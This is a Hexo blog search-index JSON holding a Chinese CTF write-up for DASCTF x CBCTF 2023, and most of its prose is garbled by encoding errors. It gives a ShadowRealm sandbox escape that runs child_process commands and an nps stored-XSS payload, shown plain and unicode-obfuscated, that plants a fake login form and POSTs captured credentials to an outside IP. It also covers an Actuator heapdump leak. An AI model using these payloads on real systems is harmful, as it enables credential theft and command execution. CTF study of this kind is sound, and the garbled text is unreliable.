{"meta":{"title":"Hexo","subtitle":"","description":"","author":"1llustrious","url":"https://1llustrious.github.io","root":"/"},"pages":[{"title":"404","text":"","path":"404/index.html","date":"11-29","excerpt":""},{"title":"search","text":"","path":"search/index.html","date":"11-29","excerpt":""}],"posts":[{"title":"","text":"DAS0RAYSxCBCTFå¤ç°DAS0RAYSxCBCTFå†™åœ¨å‰é¢wcsnmd,è°ç»™ğŸ‘´å‡ºçš„è¿™ä¹ˆæ¶å¿ƒçš„web,nmdçˆ†é›¶äº†,tmdæ€»å…±3100çš„è§£,ä»€ä¹ˆâˆšâ‘§ç©æ„å„¿. wp:â€Œâ€ â¡ â£â€Œâ€ â€â£â¢â¢ â€Œâ€â€¬ â£ â€Œâ£â¢â€Œâ¡â¤â¢â¤â¤â€Œâ€Œâ¡â¢â€Œâ€ â£â€Œâ€Œâ¡â£ DASCTF x CBCTF - é£ä¹¦äº‘æ–‡æ¡£ (feishu.cn) DASCTFXCBCTF_2023_bypassJava_Wp (pankas.top) yet another boxè¿™é¢˜æ˜¯ä¸€ä¸ªæ¯”è¾ƒæ–°çš„æ²™ç®±shadowrealm,è¿™bydå’Œnodeçš„vm8å¤ªä¸€æ ·,æœ‰ç€è‡ªå·±çš„å…¨å±€å¯¹è±¡å’Œå†…ç½®å‡½æ•°,å°±æŒºæŠ½è±¡,æ²¡æ³•åƒvm,ä¹Ÿæ— æ³•é€šè¿‡prototype pollutionæ§åˆ¶ä¸»æ¨¡å—ä¸­çš„å†…ç½®å±æ€§å¦å¤–ç”±äºä¸ package.json å£°æ˜äº† â€œtypeâ€:â€moduleâ€ ä¸”æ–‡ä»¶ç»“å°¾ä¸º .mjsï¼Œæ‰€é‡‡ç”¨çš„ESM é»˜è®¤strict modeï¼Œæ— æ³•é€šè¿‡ [stack-trace-api](Stack trace API Â· V8 â€” å †æ ˆè·Ÿè¸ª API Â·V8å‘åŠ¨æœº) è·¨ä¸Šä¸‹æ–‡å–å¾—å¯åˆ©ç”¨å¯¹è±¡ã€‚ Stack trace APIä»…ä½œä¸ºå­¦ä¹ è®°å½•ä½¿ç”¨,å¹¶ä¸ä¸ºæœ¬é¢˜æä¾›æ€è·¯. é»˜è®¤æƒ…å†µä¸‹ï¼ŒV8 æŠ›å‡ºçš„å‡ ä¹æ‰€æœ‰é”™è¯¯éƒ½æœ‰ä¸€ä¸ªå±æ€§,æŠ›å‡ºé”™è¯¯çš„æ—¶å€™ä¼šç”¨åˆ°æ–¹æ³•,è¯¥æ–¹æ³•èƒ½è·å¾—åˆ°å¤–é¢çš„å…¨å±€å¯¹è±¡. Shadow-Realm-APIWrapped Function Exotic Objectsæ˜¯ä¸€ç§å¥‡å¼‚å¯¹è±¡,å†…å«ä¸€ä¸ªå›è°ƒå‡½æ•°.å…·æœ‰ä¸€äº›å†…ç½®æ§½slot,: Internal slots Type Description [[WrappedTargetFunction]] Callable Object Stores the callable object. [[Call]] The [[Call]] internal method Executes code associated with this objectâ€™s [[WrappedTargetFunction]]. [[Realm]] Realm Record The realm in which the function was created. è¿˜æœ‰[[Prototype]] and [[Extensible]] å¯¹è±¡çš„[[call]]æ–¹æ³•è·å–ä¸¤ä¸ªå‚æ•°:thisArgument, argumentsList .è°ƒç”¨æ—¶ä¼šå®ç°ä»¥ä¸‹æ­¥éª¤: 1.è®¾ç½®è¿è¡Œä»£ç çš„ä¸Šä¸‹æ–‡.æ‰§è¡Œä¸Šä¸‹æ–‡é€šå¸¸åŒ…æ‹¬æ‰§è¡Œå‡½æ•°çš„ä½œç”¨åŸŸã€å˜é‡ã€this å€¼ç­‰ä¿¡æ¯ã€‚ 2.è®¾ç½®æ–°çš„ä½œç”¨åŸŸcalleecontext. 3.æ‰§è¡Œassertæ–­è¨€,ç¡®ä¿calleecontextæ˜¯ç›®å‰æ­£åœ¨æ‰§è¡Œçš„ä¸Šä¸‹æ–‡. 4.ç”¨resultå‚¨å­˜**OrdinaryWrappedFunctionCall(F, thisArgument, argumentsList)**çš„è¿è¡Œç»“æœ 5.calleeContext è¢«ä»æ‰§è¡Œä¸Šä¸‹æ–‡æ ˆä¸­ç§»é™¤ï¼Œè€Œ callerContext è¢«æ¢å¤ä¸ºå½“å‰è¿è¡Œçš„æ‰§è¡Œä¸Šä¸‹æ–‡ã€‚ 6.åˆ¤æ–­è¿”å›ç±»å‹,å¦‚æœ[[TYPE]]å·²è¿”å›,åˆ™è¿”å›value. 7.å¤„ç†å¼‚å¸¸ 8.æ‰§è¡Œç»“æŸ. dynamic importæ–¹æ¡ˆé€šè¿‡åŠ¨æ€ import å…è®¸æˆ‘ä»¬æŒ‰éœ€åŠ è½½ JavaScript æ¨¡å—ï¼Œè€Œä¸ä¼šåœ¨æœ€å¼€å§‹çš„æ—¶å€™å°±å°†å…¨éƒ¨æ¨¡å—åŠ è½½ã€‚ åŠ¨æ€ import è¿”å›äº†ä¸€ä¸ª Promise å¯¹è±¡ï¼Œè¿™ä¹Ÿæ„å‘³ç€å¯ä»¥åœ¨ then ä¸­ç­‰æ¨¡å—åŠ è½½æˆåŠŸåå»åšä¸€äº›æ“ä½œã€‚ æ‰€ä»¥importå¯¼å…¥éœ€è¦é€šè¿‡thenå»è§¦å‘å…¶æ–¹æ³•. importåœ¨æ‰§è¡Œæ–¹æ³•åä»ç„¶æ˜¯promiseå¯¹è±¡,é‡‡ç”¨çš„ç±»ä¼¼äºé“¾å¼è°ƒç”¨. 123var test = import(&quot;child_process&quot;).then(m=&gt;console.log(m)) å…¶ä¸­testè·å–promiseå¼‚æ­¥å¯¹è±¡,è€Œmç›´æ¥å°±è·å¾—child_processå¯¹è±¡. expç®€è€Œè¨€ä¹‹ 1ShadowRealm.prototype.evaluate =&gt; PerformShadowRealmEval =&gt; Execution Contexts æ”¯æŒdynamic import â€œDynamic importâ€ æ˜¯æŒ‡åœ¨ JavaScript ä¸­åŠ¨æ€åŠ è½½æ¨¡å—æˆ–æ–‡ä»¶çš„èƒ½åŠ›ã€‚è¿™æ˜¯ ECMAScript 2020 æ ‡å‡†çš„ä¸€éƒ¨åˆ†ï¼Œå¼•å…¥äº† import() å‡½æ•°ï¼Œå®ƒå¯ä»¥åœ¨è¿è¡Œæ—¶å¼‚æ­¥åŠ è½½æ¨¡å—ã€‚è¿™ä¸ä¼ ç»Ÿçš„é™æ€ import è¯­å¥ä¸åŒï¼Œåè€…åœ¨ä»£ç åŠ è½½æ—¶å³ç¡®å®šäº†è¦å¯¼å…¥çš„æ¨¡å—ã€‚ 12import(&#x27;child_process&#x27;).then(m=&gt;m.execSync(&#x27;/readflag &gt; /app/asserts/flag&#x27;));1; npsmdåˆæ˜¯xss,ğŸ‘´åˆtnndä¸ä¼š,ã—ã­ï¼ ğŸ§€ä¸€ä¸ªnpsç½‘ç«™ä¸Šçš„xss.æ¶‰åŠCVE-2023-46486 é¡¹ç›®åœ°å€ å½±å“èŒƒå›´: nps&lt;&#x3D;V0.26.10 ä½ tmæè¿™æ”¾å±å‘¢,æœ€æ–°ç‰ˆæœ¬å°±æ˜¯è¿™ä¸ª,21å¹´æœ€åpublishäº†. æ¼æ´æ€ä¹ˆä¸ªäº‹: bootstrapTableå¹¶æœªé…ç½®escapeå­—æ®µ,ä¸”ä½¿ç”¨æ—¶ä¸æ”¹é»˜è®¤é…ç½® kokodayo,web&#x2F;views&#x2F;client&#x2F;list.html è¿™é‡Œè®¾ç½®å…¬é’¥,é˜²æ­¢è¢«ntr(è¢«åˆ«äººç”¨ä»£ç†),ä½ ä¹Ÿä¸å¸Œæœ›ä½ æ‹¿ä¸åˆ°shellå§(bushi) åŒä¸ºä»£ç†,ç»å¸¸è¢«æèµ·çš„frpå’Œvenoméƒ½æ²¡å¤ªæ³¨æ„å…¬é’¥,å®é™…ä¸Šæ˜¯æœ‰å…¬é’¥è¿™ä¸€é€‰é¡¹çš„. è¿™é‡Œ,æˆ‘ä»¬å®Œå…¨å°±èƒ½å¤Ÿé€šè¿‡å®¢æˆ·ç«¯å»è¿›è¡Œæ”»å‡»äº†. å¼€æ‰“ğŸ˜“cnm,sbwindows,æ­»æ´»ç”¨ä¸æˆ,linuxä¸€ä¸‹å°±å‡ºæ¥äº†å’ŒğŸ‘´ğŸ˜¡äº† âˆšâ‘§ç©æ„,å½“ğŸ‘´â­ğŸ˜¡å§ é¦–å…ˆä¸‹è½½å®¢æˆ·ç«¯,è¿™ä¸€ç‚¹å’Œfrpçš„adminç«¯å’Œagentç«¯ç±»ä¼¼ ç„¶åé…ç½®å®¢æˆ·ç«¯çš„é…ç½®æ–‡ä»¶ 12345[common]server_addr=127.0.0.1:8024conn_type=tcpvkey=123remark=&lt;sCRiPt&gt;alert(`nps hacker`)&lt;/sCrIpT&gt; Ã—æˆåŠŸäº†,ç‹ ç‹ åœ°Ã—è¿›å» remoteå¹²ğŸ¤ªå¿†!æ‚Ÿ!è¿™å°±æ˜¯xssçš„æœºå™¨äººåˆ›é€ é¦–å…ˆé¢˜ç›®é€šè¿‡jsä»£ç é€ äº†ä¸ªåå°æœºå™¨äºº,ğŸ‘´å¾ˆå–œæ¬¢ 1234567891011121314151617181920212223242526272829303132333435363738394041424344import &#123;chromium, errors&#125; from &quot;playwright-chromium&quot;;const PASSWORD = &quot;DASCTF_flag&quot;;(async () =&gt; &#123; async function visit() &#123; const page = await context.newPage(); try &#123; for (let i = 0; i &lt; 3; i++)&#123; try&#123; await page.goto(&#x27;http://a.o.com:8080/client/list&#x27;); break; &#125;catch (e) &#123; console.log(e); &#125; &#125; await page.waitForTimeout(1000); const element = await page.isVisible(&#x27;button[langtag=&quot;word-login&quot;]&#x27;); if (element) &#123; await page.fill(&#x27;input[name=&quot;username&quot;]&#x27;, &#x27;admin&#x27;); await page.fill(&#x27;input[name=&quot;password&quot;]&#x27;, PASSWORD); await page.click(&#x27;button[langtag=&quot;word-login&quot;]&#x27;); &#125; await page.waitForTimeout(1000); await page.close(); &#125; catch (e) &#123; if (e instanceof errors.TimeoutError)&#123; console.log(e); await page.close(); &#125;else&#123; console.log(e); &#125; &#125; &#125; const browser = await chromium.launch(&#123; headless: true &#125;); const context = await browser.newContext(); context.setDefaultTimeout(10000); setInterval(visit, 30000);&#125;)(); çœ‹ä¸æ‡‚æ²¡å…³ç³»,ğŸ‘´æ¥å¸¦ä½ åˆ†æä¸€ä¸‹. é¦–å…ˆæ•´ä¸ªå°±æ˜¯ä¸€å¨shitâ›°, é€šè¿‡ä¸€ä¸ªç®­å¤´å‡½æ•°()çš„æ–¹å¼ç«‹å³è°ƒç”¨ 123456const browser = await chromium.launch(&#123; headless: true &#125;); const context = await browser.newContext(); context.setDefaultTimeout(10000); setInterval(visit, 30000); é¦–å…ˆåˆ›å»ºä¸€ä¸ªæµè§ˆå™¨å’Œä¸Šä¸‹æ–‡,ç„¶åè®¾ç½®setIneterval,è¡¨ç¤ºæ¯ä¸‰åç§’è°ƒç”¨visit,å‡½æ•°,è®©ğŸ‘´çœ‹çœ‹visitå‡½æ•°æ€ä¹ˆä¸ªäº‹ 123456789101112131415161718192021222324252627282930async () =&gt; &#123; async function visit() &#123; const page = await context.newPage(); try &#123; for (let i = 0; i &lt; 3; i++)&#123; try&#123; await page.goto(&#x27;http://a.o.com:8080/client/list&#x27;); break; &#125;catch (e) &#123; console.log(e); &#125; &#125; await page.waitForTimeout(1000); const element = await page.isVisible(&#x27;button[langtag=&quot;word-login&quot;]&#x27;); if (element) &#123; await page.fill(&#x27;input[name=&quot;username&quot;]&#x27;, &#x27;admin&#x27;); await page.fill(&#x27;input[name=&quot;password&quot;]&#x27;, PASSWORD); await page.click(&#x27;button[langtag=&quot;word-login&quot;]&#x27;); &#125; await page.waitForTimeout(1000); await page.close(); &#125; catch (e) &#123; if (e instanceof errors.TimeoutError)&#123; console.log(e); await page.close(); &#125;else&#123; console.log(e); &#125; &#125; &#125; é¦–å…ˆè·å–æ–°é¡µé¢,ç„¶åè®¿é—®ä¸‰æ¬¡http://a.o.com:8080/client/list ä½ çœ‹çœ‹çœ¼ç†Ÿä¸,&#x2F;client&#x2F;liståˆšå¥½å°±æ˜¯åˆšæ‰å±•ç¤ºxssçš„è·¯å¾„,ä½ å“,ä½ ç»†å“.è¿™ä¸ªhostçœ¼ç†Ÿä¸,è¿™å¯æ˜¯åœ¨dockeré‡Œé¢è®¾ç½®çš„åœ°å€æ˜ å°„å•Š. ãªã‚‰ã° ç­”ãˆã¯ã²ã¨ã¤ã  å°±æ˜¯xss,æ¥ä¸‹æ¥å°±æ˜¯åˆ†æè¿™ä¸ªæœºå™¨äººäº‹æ€ä¹ˆæ“ä½œçš„äº†. é¦–å…ˆè¦çœ‹æœ‰æ— button[langtag=&quot;word-login&quot;]è¿™ç©æ„ é‚£æˆ‘ä»¬å°±éœ€è¦è®¾ç½®ä¸€ä¸ªbuttonäº†,ä¸è¿‡æˆ‘ä»¬å¯ä»¥åœ¨è¿™é‡Œé¢ä¸‹ç‚¹æ¯’ 1&lt;button onclick=&quot;fetch(&#x27;http://43.143.192.19:1145/&#x27;,&#123;method:&#x27;POST&#x27;,body:$(&#x27;#username&#x27;)[0].value+&#x27;___&#x27;+$(&#x27;#password&#x27;)[0].value&#125;);&quot; langtang=&gt;&lt;/button&gt; $(â€˜#usernameâ€™) æ˜¯ä¸€ä¸ª jQuery é€‰æ‹©å™¨ï¼Œç”¨äºé€‰æ‹©å…·æœ‰æŒ‡å®š id å±æ€§çš„ HTML å…ƒç´ ã€‚åœ¨è¿™ä¸ªé€‰æ‹©å™¨ä¸­ï¼Œ#username è¡¨ç¤ºè¦é€‰æ‹© id ä¸º â€œusernameâ€ çš„å…ƒç´ ã€‚ä¼šä»è¾“å…¥è·å– 123&lt;input type=&quot;text&quot; id=&quot;username&quot; name=&quot;username&quot; value=&quot;flag&quot;&gt; å†æ ¹æ®è¿™ä¸ª 12await page.fill(&#x27;input[name=&quot;username&quot;]&#x27;, &#x27;admin&#x27;); await page.fill(&#x27;input[name=&quot;password&quot;]&#x27;, PASSWORD); è®©æœºå™¨äººå»è¾“å…¥æˆ‘ä»¬è®¾ç½®å¥½çš„ç™»å½•æ¡†,ä»è€Œé€šè¿‡inputè·å–åˆ°flag. 12&lt;input name=&quot;username&quot; id=&quot;username&quot; class=&quot;form-control&quot; placeholder=&quot;Username&quot; required=&quot;&quot; langtag=&quot;word-username&quot;&gt;&lt;input name=&quot;password&quot; id=&quot;password&quot; type=&quot;password&quot; class=&quot;form-control&quot; placeholder=&quot;Password&quot; required=&quot;&quot; langtag=&quot;word-password&quot;&gt; å¦‚æ­¤,åœˆå¥—å·²è®¾,åªç­‰æ•Œå†›è¿›å…¥ 1234567891011121314&lt;html&gt; &lt;head&gt;&lt;/head&gt; &lt;body&gt; &lt;form class=&quot;m-t&quot; onsubmit=&quot;return false&quot;&gt; &lt;div class=&quot;form-group&quot;&gt; &lt;input name=&quot;username&quot; id=&quot;username&quot; class=&quot;form-control&quot; placeholder=&quot;Username&quot; required=&quot;&quot; langtag=&quot;word-username&quot;&gt; &lt;/div&gt; &lt;div class=&quot;form-group&quot;&gt; &lt;input name=&quot;password&quot; id=&quot;password&quot; type=&quot;password&quot; class=&quot;form-control&quot; placeholder=&quot;Password&quot; required=&quot;&quot; langtag=&quot;word-password&quot;&gt; &lt;/div&gt; &lt;button onclick=&quot;fetch(&#x27;http://43.143.192.19:1145/&#x27;,&#123;method:&#x27;POST&#x27;,body:$(&#x27;#username&#x27;)[0].value+&#x27;___&#x27;+$(&#x27;#password&#x27;)[0].value&#125;);&quot; langtag=&quot;word-login&quot;&gt;Login&lt;/button&gt; &lt;/form&gt; &lt;/body&gt;&lt;/html&gt; è¿™ä¹ˆå¤æ‚æ•°æ®ä¼ è¾“èµ·æ¥ä¸æ–¹ä¾¿,ğŸ‘´ä¸å–œæ¬¢,æ¢ä¸€ä¸ª expunicodeå°±è¡Œ,è€Œä¸”æ§åˆ¶å°å¤§å¤§æ”¯æŒunicode 12345[common]server_addr=node4.buuoj.cn:26658conn_type=tcpvkey=123remark=&lt;/a&gt;&lt;sCRiPt&gt;document.write`\\u003c\\u0068\\u0074\\u006d\\u006c\\u003e\\u000a\\u0020\\u0020\\u0020\\u0020\\u003c\\u0068\\u0065\\u0061\\u0064\\u003e\\u003c\\u002f\\u0068\\u0065\\u0061\\u0064\\u003e\\u000a\\u0020\\u0020\\u0020\\u0020\\u003c\\u0062\\u006f\\u0064\\u0079\\u003e\\u000a\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u003c\\u0066\\u006f\\u0072\\u006d\\u0020\\u0063\\u006c\\u0061\\u0073\\u0073\\u003d\\u0022\\u006d\\u002d\\u0074\\u0022\\u0020\\u006f\\u006e\\u0073\\u0075\\u0062\\u006d\\u0069\\u0074\\u003d\\u0022\\u0072\\u0065\\u0074\\u0075\\u0072\\u006e\\u0020\\u0066\\u0061\\u006c\\u0073\\u0065\\u0022\\u003e\\u000a\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u003c\\u0064\\u0069\\u0076\\u0020\\u0063\\u006c\\u0061\\u0073\\u0073\\u003d\\u0022\\u0066\\u006f\\u0072\\u006d\\u002d\\u0067\\u0072\\u006f\\u0075\\u0070\\u0022\\u003e\\u000a\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u003c\\u0069\\u006e\\u0070\\u0075\\u0074\\u0020\\u006e\\u0061\\u006d\\u0065\\u003d\\u0022\\u0075\\u0073\\u0065\\u0072\\u006e\\u0061\\u006d\\u0065\\u0022\\u0020\\u0069\\u0064\\u003d\\u0022\\u0075\\u0073\\u0065\\u0072\\u006e\\u0061\\u006d\\u0065\\u0022\\u0020\\u0063\\u006c\\u0061\\u0073\\u0073\\u003d\\u0022\\u0066\\u006f\\u0072\\u006d\\u002d\\u0063\\u006f\\u006e\\u0074\\u0072\\u006f\\u006c\\u0022\\u0020\\u0070\\u006c\\u0061\\u0063\\u0065\\u0068\\u006f\\u006c\\u0064\\u0065\\u0072\\u003d\\u0022\\u0055\\u0073\\u0065\\u0072\\u006e\\u0061\\u006d\\u0065\\u0022\\u0020\\u0072\\u0065\\u0071\\u0075\\u0069\\u0072\\u0065\\u0064\\u003d\\u0022\\u0022\\u0020\\u006c\\u0061\\u006e\\u0067\\u0074\\u0061\\u0067\\u003d\\u0022\\u0077\\u006f\\u0072\\u0064\\u002d\\u0075\\u0073\\u0065\\u0072\\u006e\\u0061\\u006d\\u0065\\u0022\\u003e\\u000a\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u003c\\u002f\\u0064\\u0069\\u0076\\u003e\\u000a\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u003c\\u0064\\u0069\\u0076\\u0020\\u0063\\u006c\\u0061\\u0073\\u0073\\u003d\\u0022\\u0066\\u006f\\u0072\\u006d\\u002d\\u0067\\u0072\\u006f\\u0075\\u0070\\u0022\\u003e\\u000a\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u003c\\u0069\\u006e\\u0070\\u0075\\u0074\\u0020\\u006e\\u0061\\u006d\\u0065\\u003d\\u0022\\u0070\\u0061\\u0073\\u0073\\u0077\\u006f\\u0072\\u0064\\u0022\\u0020\\u0069\\u0064\\u003d\\u0022\\u0070\\u0061\\u0073\\u0073\\u0077\\u006f\\u0072\\u0064\\u0022\\u0020\\u0074\\u0079\\u0070\\u0065\\u003d\\u0022\\u0070\\u0061\\u0073\\u0073\\u0077\\u006f\\u0072\\u0064\\u0022\\u0020\\u0063\\u006c\\u0061\\u0073\\u0073\\u003d\\u0022\\u0066\\u006f\\u0072\\u006d\\u002d\\u0063\\u006f\\u006e\\u0074\\u0072\\u006f\\u006c\\u0022\\u0020\\u0070\\u006c\\u0061\\u0063\\u0065\\u0068\\u006f\\u006c\\u0064\\u0065\\u0072\\u003d\\u0022\\u0050\\u0061\\u0073\\u0073\\u0077\\u006f\\u0072\\u0064\\u0022\\u0020\\u0072\\u0065\\u0071\\u0075\\u0069\\u0072\\u0065\\u0064\\u003d\\u0022\\u0022\\u0020\\u006c\\u0061\\u006e\\u0067\\u0074\\u0061\\u0067\\u003d\\u0022\\u0077\\u006f\\u0072\\u0064\\u002d\\u0070\\u0061\\u0073\\u0073\\u0077\\u006f\\u0072\\u0064\\u0022\\u003e\\u000a\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u003c\\u002f\\u0064\\u0069\\u0076\\u003e\\u000a\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u003c\\u0062\\u0075\\u0074\\u0074\\u006f\\u006e\\u0020\\u006f\\u006e\\u0063\\u006c\\u0069\\u0063\\u006b\\u003d\\u0022\\u0066\\u0065\\u0074\\u0063\\u0068\\u0028\\u0027\\u0068\\u0074\\u0074\\u0070\\u003a\\u002f\\u002f\\u0034\\u0033\\u002e\\u0031\\u0034\\u0033\\u002e\\u0031\\u0039\\u0032\\u002e\\u0031\\u0039\\u003a\\u0031\\u0031\\u0034\\u0035\\u002f\\u0027\\u002c\\u007b\\u006d\\u0065\\u0074\\u0068\\u006f\\u0064\\u003a\\u0027\\u0050\\u004f\\u0053\\u0054\\u0027\\u002c\\u0062\\u006f\\u0064\\u0079\\u003a\\u0024\\u0028\\u0027\\u0023\\u0075\\u0073\\u0065\\u0072\\u006e\\u0061\\u006d\\u0065\\u0027\\u0029\\u005b\\u0030\\u005d\\u002e\\u0076\\u0061\\u006c\\u0075\\u0065\\u002b\\u0027\\u005f\\u005f\\u005f\\u0027\\u002b\\u0024\\u0028\\u0027\\u0023\\u0070\\u0061\\u0073\\u0073\\u0077\\u006f\\u0072\\u0064\\u0027\\u0029\\u005b\\u0030\\u005d\\u002e\\u0076\\u0061\\u006c\\u0075\\u0065\\u007d\\u0029\\u003b\\u0022\\u0020\\u006c\\u0061\\u006e\\u0067\\u0074\\u0061\\u0067\\u003d\\u0022\\u0077\\u006f\\u0072\\u0064\\u002d\\u006c\\u006f\\u0067\\u0069\\u006e\\u0022\\u003e\\u004c\\u006f\\u0067\\u0069\\u006e\\u003c\\u002f\\u0062\\u0075\\u0074\\u0074\\u006f\\u006e\\u003e\\u000a\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u003c\\u002f\\u0066\\u006f\\u0072\\u006d\\u003e\\u000a\\u0020\\u0020\\u0020\\u0020\\u003c\\u002f\\u0062\\u006f\\u0064\\u0079\\u003e\\u000a\\u003c\\u002f\\u0068\\u0074\\u006d\\u006c\\u003e`&lt;/sCrIpT&gt; 1./npc -config ./conf/npc.conf ç»ˆäºæ‹¿åˆ°äº†è‰¹,30sç‚¹ä¸€æ¬¡,ğŸ‘´tmä»¥ä¸ºxä¸è¿›å»äº† ã¾ã ã¾ã ã­ã€å¼±ã„ï¼ Deserialize?Upload!actuatorğŸ˜« é¦–å…ˆ,é¢˜ç›®æœ‰ä¸ªğŸš¢â™¥çš„ä¾èµ–,æ˜¾ç„¶ğŸ‘´ä¸çŸ¥é“è¿™æ˜¯å¹²å•¥çš„,æ€ä¹ˆåŠ,å­¦! Spring bootâ€”â€”Actuator è¯¦è§£ - æ›¹ä¼Ÿé›„ - åšå®¢å›­ (cnblogs.com) é…ç½®æ–¹é¢ 1234&lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-actuator&lt;/artifactId&gt;&lt;/dependency&gt; æœ‰äº†è¿™ä¸ªä¾èµ–,é‚£ä¹ˆSpringå°±ä¼šè‡ªåŠ¨å¼€æ”¾/actuator/healthå’Œ/actuator/infoè¿™ä¸¤ä¸ªè·¯å¾„ è®¿é—®[127.0.0.1:9090/actuator/](http://127.0.0.1:9090/actuator/),å¯ä»¥å¾—åˆ°&#x2F;acturatorçš„è·¯ç”± 1234567891011121314151617181920212223242526272829303132&#123; &quot;_links&quot;: &#123; &quot;self&quot;: &#123; &quot;href&quot;: &quot;http://127.0.0.1:9090/actuator&quot;, &quot;templated&quot;: false &#125;, &quot;health&quot;: &#123; &quot;href&quot;: &quot;http://127.0.0.1:9090/actuator/health&quot;, &quot;templated&quot;: false &#125;, &quot;health-path&quot;: &#123; &quot;href&quot;: &quot;http://127.0.0.1:9090/actuator/health/&#123;*path&#125;&quot;, &quot;templated&quot;: true &#125;, &quot;info&quot;: &#123; &quot;href&quot;: &quot;http://127.0.0.1:9090/actuator/info&quot;, &quot;templated&quot;: false &#125;, &quot;env&quot;: &#123; &quot;href&quot;: &quot;http://127.0.0.1:9090/actuator/env&quot;, &quot;templated&quot;: false &#125;, &quot;env-toMatch&quot;: &#123; &quot;href&quot;: &quot;http://127.0.0.1:9090/actuator/env/&#123;toMatch&#125;&quot;, &quot;templated&quot;: true &#125;, &quot;heapdump&quot;: &#123; &quot;href&quot;: &quot;http://127.0.0.1:9090/actuator/heapdump&quot;, &quot;templated&quot;: false &#125; &#125;&#125; ä»¥ä¸‹æ˜¯ä¸€äº›ç»å¸¸ä½¿ç”¨çš„è·¯å¾„ HTTPæ–¹æ³• Endpoint Description GET &#x2F;actuator æŸ¥çœ‹æœ‰å“ªäº›è·¯å¾„ GET &#x2F;actuator&#x2F;env æŸ¥çœ‹æ‰€æœ‰ç¯å¢ƒå±æ€§,çœ‹Springçš„çš„properties,ä½†æ˜¯ä¼šè‡ªåŠ¨è„±æ•æ‰ä¸€äº›secret keyç­‰æ•æ„Ÿä¿¡æ¯ GET &#x2F;actuator&#x2F;health æŸ¥çœ‹è¿è¡ŒæŒ‡æ ‡ GET &#x2F;actuator&#x2F;info æŸ¥çœ‹ properties ä¸­ info å¼€å¤´çš„å±æ€§ï¼Œæ²’å•¥ç”¨ GET &#x2F;actuator&#x2F;heapdump è·å–JVMçš„heap dump ğŸ¤£é»˜è®¤Actuator /actuator/healthå’Œ/actuator/infoä¸¤ä¸ª endpointï¼Œå¦‚æœè¦å¼€æ”¾å…¶ä»– endpoint çš„è©±ï¼Œéœ€åœ¨åœ¨ application.properties ä¸­åšè®¾ç½®ã€‚ Heap dumpï¼ˆå †è½¬å‚¨ï¼‰æ˜¯æŒ‡å°†ä¸€ä¸ª Java è¿›ç¨‹çš„å†…å­˜ä¸­çš„å¯¹è±¡ä¿¡æ¯å’Œæ•°æ®ç»“æ„ä»¥äºŒè¿›åˆ¶æ ¼å¼å†™å…¥æ–‡ä»¶ï¼Œä»¥ä¾¿è¿›è¡Œå†…å­˜åˆ†æå’Œæ’æŸ¥å†…å­˜æ³„æ¼ç­‰é—®é¢˜ã€‚Heap dump åŒ…å«äº† Java å †å†…å­˜ä¸­çš„å¯¹è±¡å®ä¾‹ã€å¯¹è±¡å¼•ç”¨å…³ç³»ã€ç±»ä¿¡æ¯ç­‰ï¼Œå®ƒæ˜¯è¯Šæ–­å’Œè°ƒè¯• Java åº”ç”¨ç¨‹åºçš„é‡è¦å·¥å…·ä¹‹ä¸€ã€‚ ğŸ‘´è¯´ç‚¹äººè¯:åæ­£Heap dumpäº‹å†…å­˜ç›¸å…³çš„ä¸œè¥¿,è‚¯å®šæœ‰æ•æ„Ÿä¿¡æ¯,ğŸ‘´å°±æ˜¯è¦æŠŠå®ƒä¸‹ä¸‹æ¥è¿›è¡Œä¸€é€šä¹±è¶…,ä¸çŸ¥é“ä½ ä»¬æ€ä¹ˆå¿å¾—ä½çš„,äº‹ğŸ‘´ç›´æ¥æ‹¿èµ·æ¥ç‹ ç‹ åœ°åˆ†æ. æ€ä¹ˆåˆ†æ,å½“æ—¶äº‹ç”¨jdkè‡ªå¸¦çš„jhat 1jhat -J-Xmx512M &quot;/path/to/heapdump&quot; ç„¶åå°±ä¼šæœ¬åœ°èµ·ä¸€ä¸ªæœåŠ¡å™¨,é‡Œé¢å°±åŠ è½½å†…å­˜çš„å†…å®¹ md,ä¾æ‰˜âœç‰¹, 1234public SecurityFilterChain securityFilterChain(HttpSecurity http) throws Exception &#123; ((HttpSecurity)((FormLoginConfigurer)((FormLoginConfigurer)((HttpSecurity)((ExpressionUrlAuthorizationConfigurer.AuthorizedUrl)((ExpressionUrlAuthorizationConfigurer.AuthorizedUrl)http.authorizeRequests().antMatchers(new String[]&#123;&quot;/&quot;&#125;)).permitAll().antMatchers(new String[]&#123;&quot;/admin/**&quot;&#125;)).authenticated().and()).formLogin().loginProcessingUrl(&quot;/login&quot;)).permitAll()).and()).csrf().disable(); return (SecurityFilterChain)http.build(); &#125; ğŸ§€springå®‰å…¨é…ç½®,http.authorizeRequests().antMatchers(new String[]&#123;&quot;/&quot;&#125;).permitAll()è¡¨ç¤ºå¯¹&#x2F;è·¯ç”±è®¿é—®å…è®¸ä»»æ„ç”¨æˆ·, antMatchers(new String[]&#123;&quot;/admin/**&quot;&#125;).authenticated()è¡¨ç¤º/admin/å¼€å¤´éªŒè¯ç”¨æˆ· .formLogin().loginProcessingUrl(&quot;/login&quot;).permitAll()&#x2F;loginçš„è¡¨è¾¾ç™»å½•ä¸éœ€è¦éªŒè¯ è¿™é‡Œå°±æ˜¯è®©ğŸ‘´æ‹¿åˆ°password 